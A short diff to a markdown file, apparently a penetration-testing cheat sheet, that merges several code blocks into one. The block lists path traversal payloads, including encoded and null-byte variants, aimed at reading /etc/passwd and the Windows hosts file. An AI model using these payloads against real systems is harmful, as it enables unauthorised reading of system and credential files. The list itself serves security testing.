@@ -153,25 +153,15 @@ amqp-consume --server=127.0.0.1 --port=5672 --vhost=/ --username=guest --passwor
 
 ```
 /..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd%00
-```
 
-```
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-```
 
-```
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
-```
 
-```
 /../../../../../../../../../../etc/passwd
-```
 
-```
 /../../../../../../../../../../C:/Windows/System32/drivers/etc/hosts
-```
 
-```
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fC%253A%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts
 ```
 
